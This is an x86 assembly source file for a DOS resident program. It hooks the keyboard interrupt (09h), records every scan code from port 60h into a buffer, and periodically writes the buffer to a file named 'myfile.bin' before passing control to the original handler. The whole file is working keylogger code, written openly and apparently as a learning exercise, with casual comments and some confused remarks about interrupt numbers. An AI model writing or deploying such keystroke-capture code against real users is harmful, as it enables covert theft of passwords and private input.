.model tiny
.code
org 100h

Begin:
  jmp Install

	Old09h dd ?
	FName db 'myfile.bin',0
	Max = 255						; buf size. MARK: don't forget to change
	Count dw 0
	flag dw 0
	position dw 0

; Adds position number before writing to file (+ buffer length?)
; 	
add_position:
	mov bx, position
	add bx, 256 ;1
	mov position, bx
	jmp Write_not_open

; Buffer to save scan-codes
; MARK: setup buffer size here (?)
Buf db 256d dup(?)		

New09h:
	push ds
	push cs
	pop ds
  
	push ax
	push bx
	in al,60h	; Read port 60h (keyboard?)

  
	; Write scan-code to buffer
	mov bx,Count
	mov Buf[bx],al	
	inc Count
	cmp bx,Max
	jne BufNotFull	; No need to flush buffer to file
  
	push cx
	push dx
  
	cmp flag, 0	; First time? (Check if file needs to be created)
	jne Write
	mov ah,3ch			; CREATES file
	mov cx,1
	mov dx,offset FName
	mov flag,1
	int 21h
	jmp Write_not_open
  
Write:
	; Open EXISTING file
	mov dx,offset FName	; OPENS file
	mov al, 1
	mov ah, 3dh
	int 21h
	jmp add_position	; Setup position to start writing
  
Write_not_open:	; Shake, not stir.
	; 1) Set "cursor" position
	mov bx,ax
	mov ah,42h
	mov al,0
	mov cx,0
	mov dx, position
	int 21h
	;mov bx,ax
	
	; 2) Write buffer to file
	mov CX,256d;2h	; Bytes amount to write (flush buffer size)
	mov DX,offset Buf
	mov ah,40h
	int 21h
	
	;Close the file, restore the registers, reset buffer
	mov ah,3eh
	int 21h		; Close
	pop dx		; Restore
	pop cx
	mov Count,0 ; Reset
  
BufNotFull:
  pop bx
  pop ax
  pop ds
  jmp DWORD PTR cs:Old09h	; Execute the original interrupt
  
ResSize = $ - Begin		; CUT HERE

Install:
	; Get and save interrupt vector for 09h (int 21h)
	mov ax,3509h			
	int 21h
	mov WORD PTR Old09h,bx
	mov WORD PTR Old09h+2,es
	
	; Set new logic for 09h of int 21h
	mov ax,2509h
	mov dx,offset New09h
	int 21h
	
	; "Suicide", remain as resident
	mov ax,3100h
	mov dx,(ResSize+10fh)/16
	int 21h
  
 
end Begin
 
